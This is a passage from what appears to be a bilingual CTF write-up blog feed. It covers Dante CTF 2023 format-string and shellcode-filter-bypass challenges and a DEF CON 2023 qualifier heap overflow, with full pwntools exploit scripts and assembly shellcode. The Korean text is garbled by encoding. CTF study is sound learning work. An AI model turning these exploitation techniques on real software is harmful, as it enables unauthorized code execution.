class="line"></span><br><span class="line"><span class="comment"># one more main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%3$p_%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="string">&#x27;libc.address @ &#x27;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">stack_ret2 = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>) + <span class="number">0x2148</span></span><br><span class="line">info(<span class="string">&#x27;stack_ret2 @ &#x27;</span> +<span class="built_in">hex</span>(stack_ret2))</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>]</span><br><span class="line">value = libc.address + one_gadget[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(<span class="built_in">str</span>(value)))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line"></span><br><span class="line">addr = stack_ret2</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit 2"></a>Exploit 2</h2><p>Ïù¥ Î∞©Î≤ïÏóê ÎåÄÌï¥ÏÑ† Í∏ÄÏùÑ Îî∞Î°ú ÏûëÏÑ±ÌïòÎ†§Í≥† ÌïúÎã§. ÏïÑÎûò ÏùµÏä§ÌîåÎ°úÏûáÏùÑ Ï∞∏Í≥†ÌïòÏòÄÎã§.</p><ul><li><a href="https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell">https://github.com/nobodyisnobody/write-ups/tree/main/DanteCTF.2023/pwn/Sentence.To.Hell</a></li></ul><ol><li>stack, pie leak</li><li>stack retÎ•º <code>_start</code>Î°ú ÎçÆÏñ¥ Ìïú Î≤à Îçî Ïã§ÌñâÎêòÎèÑÎ°ù Ìï®</li><li>libc, ld leak (ÌõÑÏóê ÏïåÍ≥†Î≥¥Îãà ld leakÌïú Í∞íÏù¥ rtldÏòÄÎã§.)</li><li>ld_leak + 0x13b0ÏùÑ your_nameÏúºÎ°ú ÎçÆÏùå</li><li>your_nameÏóê ÌéòÏù¥Î°úÎìú ÏûÖÎ†•</li></ol><ul><li>ÏõêÎûò ld_leak + 0x13b0 Ï£ºÏÜåÏóêÎäî x Í∞íÏù¥ Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎã§. Í∑∏Î¶¨Í≥† x + 8Ïóê ÏúÑÏπòÌï® Í∞í(Ï£ºÏÜå)Ïù¥ callÏù¥ ÎêúÎã§.</li><li>ld_leak + 0x13b0 Ï£ºÏÜåÎ•º your_nameÏúºÎ°ú ÎçÆÏóàÍ∏∞ ÎïåÎ¨∏Ïóê ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú your_name + 8Ïóê ÏúÑÏπòÌïú Í∞í(Ï£ºÏÜå)Ïù¥ callÏù¥ ÎêúÎã§.</li><li>Ïù¥Îäî Ïö∞Î¶¨Ïùò ÏûÖÎ†•Í∞íÏù¥Îãà ÏõêÌïòÎäî Ï£ºÏÜåÎ•º callÌï† Ïàò ÏûàÎã§.</li><li>Ïù¥Î•º ÏúÑÌï¥ your_nameÏóê onegadgetÏùÑ, your_name+8ÏóêÎäî your_name Ï£ºÏÜåÎ•º ÎÑ£Ïñ¥Ïïº ÌïúÎã§.</li><li>ÏÇ¨Ïã§ ÏµúÏ¢ÖÏ†ÅÏúºÎ°ú Ïã§ÌñâÎêòÎäî Ï£ºÏÜåÎäî pie_base + y ÌòïÌÉúÎ°ú Í≥ÑÏÇ∞ÎêòÏñ¥ callÏù¥ ÎêòÍ≥†, yÎäî x + 8, Ï¶â your_name + 8 Ïóê ÏúÑÏπòÌïú Í∞íÏù¥Îã§.</li><li>Í≤∞Íµ≠ your_nameÏóêÎäî p64(one_gadget) + p16(your_name_off) + p8(0)Ïù¥ Îì§Ïñ¥Í∞ÄÏïº ÌïúÎã§.</li></ul><p>Ïù¥ Î∞©Î≤ïÏùÄ main Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÏñ¥ returnÎê† Îïå <code>_dl_fini</code> Ìï®ÏàòÏóêÏÑú <code>.fini_array</code>Î•º Ï∞∏Ï°∞ ÌõÑ Ìò∏Ï∂úÌïòÎäîÎç∞, <code>.fini_array</code>ÏùÑ Ïñ¥ÎñªÍ≤å Ï∞∏Ï°∞ÌïòÎäîÏßÄÏóê ÏßëÏ§ëÌïòÎ©¥ Ïù¥Îü∞ ÏùµÏä§ÌîåÎ°úÏûáÏùÑ ÏûëÏÑ±Ìï† Ïàò ÏûàÎã§. your_name Î≥ÄÏàòÎ•º <code>.fini_array</code>Î°ú Ï∞©Í∞ÅÌïòÍ≤å ÎßåÎì§ÏóàÎã§.</p><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./sentencep&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;challs.dantectf.it&#x27;</span>,<span class="number">31531</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./sentencep&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%p_%13$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_ret = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) + <span class="number">0x2148</span></span><br><span class="line">info(<span class="string">&#x27;stack_ret @ &#x27;</span> +<span class="built_in">hex</span>(stack_ret))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>) - <span class="number">0x1229</span></span><br><span class="line">info(<span class="string">&#x27;pie @ &#x27;</span> +<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">addr = stack_ret </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one more main</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%3$p_%7$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x114a37</span></span><br><span class="line">info(<span class="string">&#x27;libc.address @ &#x27;</span> +<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">ld_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27; &#x27;</span>).strip(), <span class="number">16</span>)</span><br><span class="line">ld_base = ld_leak - <span class="number">0x3a040</span></span><br><span class="line">info(<span class="string">&#x27;ld_leak @ &#x27;</span> +<span class="built_in">hex</span>(ld_leak))</span><br><span class="line">info(<span class="string">&#x27;ld_base @ &#x27;</span> +<span class="built_in">hex</span>(ld_base))</span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">addr = stack_ret - <span class="number">0x100</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># one more main</span></span><br><span class="line">one_gadget = [<span class="number">0x50a37</span>, <span class="number">0xebcf1</span>, <span class="number">0xebcf5</span>, <span class="number">0xebcf8</span>] <span class="comment"># one_gadget[0]Ïóê 0a ÏûàÏñ¥ÏÑú ÏïàÎê®</span></span><br><span class="line"><span class="comment"># your_name = libc.address + one_gadget[0] - 0x3d88 # Í∏∏Ïù¥Í∞Ä Í∏∏Ïñ¥ÏÑú ÏûÖÎ†•Ïù¥ ÎÑòÏñ¥Í∞ê</span></span><br><span class="line"></span><br><span class="line">your_name = p64(libc.address + one_gadget[<span class="number">1</span>]) + p16(<span class="number">0x4050</span>) + p8(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(repr(str(your_name)))</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, your_name) </span><br><span class="line"></span><br><span class="line">value = e.symbols[<span class="string">&#x27;your_name&#x27;</span>]</span><br><span class="line">addr = ld_leak + <span class="number">0x13b0</span> <span class="comment"># ld_leak = rtld</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(value))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dante </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> Full Relro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dante CTF 2023 - Soulcode (shellcode, syscall bypass)</title>
      <link href="/230607-dantectf2023-soulcode/"/>
      <url>/230607-dantectf2023-soulcode/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2000">https://ctftime.org/event/2000</a></li></ul><blockquote><p>Before you leave the realm of the dead you must leave a message for posterity!<br>Author: GB1<br>Medium<br><code>challs.dantectf.it:31532/tcp</code></p></blockquote><ul><li>[56 solves &#x2F; 246 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏûÖÎ†•Í∞í Ïã§Ìñâ -&gt; ÏâòÏΩîÎìú Ïã§Ìñâ<br>seccomp Í±∏Î†§ ÏûàÏùå -&gt; flag.txtÎ•º orw Ìï¥ÏïºÌï®</p><p>ÏûÖÎ†•Í∞í(ÏâòÏΩîÎìú) blacklist: 0xcd, 0x80, 0x0f, 0x05, 0x89</p><p>ÏïàÎêòÎäî Ïñ¥ÏÖàÎ∏îÎ¶¨</p><ul><li>\xcd\x80 : int 0x80</li><li>\x0f\x05 : syscall</li><li>pop, add Î™ÖÎ†π</li></ul><h2 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve 1"></a>Solve 1</h2><p><code>\x0f\x05</code>Ïù∏ syscallÏùÑ Ïö∞ÌöåÌïòÎäî Î∞©ÏãùÏù¥Îã§.</p><h3 id="Solve-Code"><a href="#Solve-Code" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./soulcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challs.dantectf.it&quot;</span>, <span class="number">31532</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.global _start</span></span><br><span class="line"><span class="string">.intel_syntax noprefix</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    lea rdi, [rip+flag]</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall1 + 1]</span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall1]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall1:</span></span><br><span class="line"><span class="string">    .byte 0x0e</span></span><br><span class="line"><span class="string">    .byte 0x04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall2 + 1]</span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall2]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall2:</span></span><br><span class="line"><span class="string">    .byte 0x0e</span></span><br><span class="line"><span class="string">    .byte 0x04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall3 + 1]</span></span><br><span class="line"><span class="string">    inc byte ptr [rip + syscall3]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall3:</span></span><br><span class="line"><span class="string">    .byte 0x0e</span></span><br><span class="line"><span class="string">    .byte 0x04</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">    .string &quot;flag.txt&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode1 = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(shellcode1))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = run_assembly(shellcode)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, shellcode1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve 2"></a>Solve 2</h2><p>ÏïÑÎûòÎäî blacklist ÌïÑÌÑ∞ÎßÅÌïòÎäî Ìï®ÏàòÏù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">filter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">strpbrk</span>(input, &amp;blacklist);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Ops! Not allowed char detected&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>strpbrk</code> Ìï®ÏàòÎäî <code>\x00</code>ÍπåÏßÄÎßå Í≤ÄÏÇ¨ÌïòÎäîÎç∞, Ïù¥Îäî ÏâòÏΩîÎìúÏóê <code>\x00</code>Ïù¥ ÏûàÏúºÎ©¥ Í∑∏ Ï†ÑÍπåÏßÄÎßå Í≤ÄÏÇ¨ÌïòÍ≥† Îí§ÏóêÎäî Í≤ÄÏÇ¨Î•º Ïö∞ÌöåÌï† Ïàò ÏûàÎã§Îäî ÏùòÎØ∏Ïù¥Îã§. Í∑∏ÎûòÏÑú Íµ≥Ïù¥ syscallÏùÑ Ïö∞ÌöåÌïòÏßÄ ÏïäÍ≥† ÌèâÎ≤îÌïòÍ≤å ÌíÄÏñ¥ÎèÑ ÎêúÎã§.</p><h3 id="Solve-Code-1"><a href="#Solve-Code-1" class="headerlink" title="Solve Code"></a>Solve Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./soulcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;challs.dantectf.it&quot;</span>, <span class="number">31532</span>)</span><br><span class="line"></span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.global _start</span></span><br><span class="line"><span class="string">.intel_syntax noprefix</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">    mov rax, 2</span></span><br><span class="line"><span class="string">    lea rdi, [rip+flag]</span></span><br><span class="line"><span class="string">    xor rsi, rsi</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax</span></span><br><span class="line"><span class="string">    xor rax, rax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov rdx, 0x100</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1</span></span><br><span class="line"><span class="string">    mov rax, 0x1</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag:</span></span><br><span class="line"><span class="string">    .string &quot;flag.txt&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode2 = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">repr</span>(shellcode2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = run_assembly(shellcode)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!&#x27;</span>, shellcode2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Dante </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DEF CON CTF Qualifier 2023 - Open House (heap)</title>
      <link href="/230602-defcon2023-open-house/"/>
      <url>/230602-defcon2023-open-house/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li></ul><blockquote><p>You are cordially invited to an exclusive Open House event, where dreams meet reality and possibilities abound. Join us for an unforgettable experience as we showcase a captivating array of properties, each waiting to become your dream home.</p></blockquote><ul><li>[68 solves]</li></ul><p>Except simple UAF, my first heap challenge XD<br>(So the exploit is going to be dirty. :p)</p><p>It is very meaningful to me because I exploited the challenge using only Googling.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><img src="/images/230602-defcon2023-open-house/1.png" width=650/><br><img src="/images/230602-defcon2023-open-house/2.png" width=450/><br><p>Ïù¥ ÌîÑÎ°úÍ∑∏Îû®ÏùÄ 4Í∞ÄÏßÄÏùò Í∏∞Îä•ÏùÑ Í∞ÄÏßÄÍ≥† ÏûàÎäîÎç∞ ÎäêÎÇåÏÉÅ Î≤åÏç® heap Î¨∏Ï†ú Í∞ôÎã§. (ÎÑ§Ïù¥Î∞çÏùÄ Îã§ Ìï¥Ï§Ä ÏÉÅÌÉúÏù¥Îã§.)</p><p>This program has 4 functions, and it feels like a heap challenge. (The naming has been done.)</p><p><br><br></p><p>main Ìï®Ïàò ÏïûÏóêÏÑú ÎßéÏù¥ Ìò∏Ï∂úÎêú add() Ìï®ÏàòÎ•º ÏÇ¥Ìé¥Î≥¥Ïûê. structÎ•º Ï†ïÏùòÌï¥ Ï£ºÍ∏∞ Ï†Ñ Î™®ÏäµÏùÄ Ï†ïÎßê Î≥µÏû°ÌñàÎã§. Ïù¥ Ìï®ÏàòÎ•º Ìï¥ÏÑùÌïòÎäî Îç∞ ÍΩ§ Ïò§ÎûòÍ±∏Î†∏Îã§. </p><p>Let‚Äôs look at the add() function, which is called a lot before the main function. Before defining the struct, it was really complicated. I spent a lot of time interpreting this function.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">review</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> content[<span class="number">512</span>];</span><br><span class="line">  review *next;</span><br><span class="line">  review *prev;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/images/230602-defcon2023-open-house/3.png" width=600/><br><p>create() Ìï®ÏàòÏóêÏÑú contentÎ•º ÏûÖÎ†•Î∞õÍ≥†, Ïù∏ÏûêÎ°ú Ìï¥ÏÑú ÏúÑÏùò add() Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïúÎã§. Ïù¥Îïå overflowÎäî Î∞úÏÉùÌïòÏßÄ ÏïäÎäîÎã§. Ï∑®ÏïΩÏ†êÏùÄ ÏïÑÎûò modify() Ìï®ÏàòÏóêÏÑú ÎÇòÌÉÄÎÇúÎã§.</p><p>In the create() function, the content is input, and the above add() function is called with the input as a argument. In this case, overflow doesn‚Äôt occur. The vulnerability appears in the modify() function below.</p><img src="/images/230602-defcon2023-open-house/4.png" width=600/><br><p>25Î≤àÏß∏ ÎùºÏù∏ÏóêÏÑú heap overflowÍ∞Ä Î∞úÏÉùÌïúÎã§. contentÎ•º ÎÑòÏñ¥ÏÑú nextÏôÄ prev Ìè¨Ïù∏ÌÑ∞ÍπåÏßÄ ÎçÆÏñ¥Ïì∏ Ïàò ÏûàÎã§. </p><p>In the 25th lne, heap overflow occurs. You can overwrite the next and prev pointers beyond the content.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><ol><li>libc address Íµ¨ÌïòÍ∏∞</li></ol><ul><li>Ï≤òÏùåÏóê 0x10~0x400Ïù¥ Ìï†ÎãπÎêòÎ©¥ fastbinÏù¥ÎÇò unsorted binÏóê Îì§Ïñ¥Í∞ÄÏßÄ ÏïäÍ≥† tcache binÏóê Îì§Ïñ¥Í∞ÑÎã§.</li><li>unsorted binÏùò ÌäπÏÑ±ÏùÑ Ïù¥Ïö©Ìï¥ÏÑú Íµ¨Ìï† Ïàò ÏûàÎã§. ÌïòÏßÄÎßå tcacheÍ∞Ä Ï°¥Ïû¨ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê tcache binÏù¥ Í∞ÄÎìù Ï∞®Í≥† ÎÇú ÌõÑ, unsorted binÏóê Ï≤≠ÌÅ¨Í∞Ä Ï†ÄÏû•ÎêúÎã§.</li><li>8Í∞úÎ•º freeÌïòÍ≥†, 9Î≤àÏß∏Î∂ÄÌÑ∞ unsorted binÏóê Ï†ÄÏû•ÎêúÎã§.</li><li>Ïù¥Îïå Ï≤≠ÌÅ¨Ïóê libc Ï£ºÏÜåÍ∞Ä Ï†ÅÌòÄÏûàÎã§. Ïù¥Í≤ÉÏùÑ Î¶≠ÌïòÏòÄÎã§.</li><li>Ïù¥ Î∏îÎ°úÍ∑∏Î•º Ï∞∏Í≥†ÌïòÏòÄÏùå: <a href="https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin">https://velog.io/@woounnan/SYSTEM-Heap-Basics-Bin</a></li></ul><ol start="2"><li>libc.symbols[‚Äòenviron‚Äô]Ïóê Ï†ÄÏû•Îêú stack address Íµ¨ÌïòÍ∏∞</li></ol><ul><li>pie base addressÎ•º Íµ¨ÌïòÍ∏∞ ÏúÑÌï¥ stack addressÎ•º Íµ¨ÌñàÎã§.</li></ul><ol start="3"><li>pie base address Íµ¨ÌïòÍ∏∞</li></ol><ul><li>stackÏóêÎäî ÎÜíÏùÄ ÌôïÎ•†Î°ú pie addressÍ∞Ä Ï°¥Ïû¨ÌïúÎã§.</li></ul><ol start="4"><li>e.got[‚Äòstrlen‚Äô]ÏùÑ system Ìï®ÏàòÎ°ú ÎçÆÏùå</li></ol><ul><li>create() Ìï®ÏàòÏóêÏÑú strlen(ÏûÖÎ†•) ÌòïÌÉúÎ°ú ÏÇ¨Ïö©ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê strlenÏùÑ system Ìï®ÏàòÎ°ú ÎçÆÍ≥† ÏûÖÎ†•ÏúºÎ°ú ‚Äò&#x2F;bin&#x2F;sh‚ÄôÎ•º Î≥¥ÎÉàÎã§.</li></ul><br><br><ol><li>Getting libc address</li></ol><ul><li>If 0x10~0x400 is initially allocated, it goes into tcache bin instead of fastbin or unsorted bin.</li><li>It can be caculated by using the characteristics of unsorted bins. But because 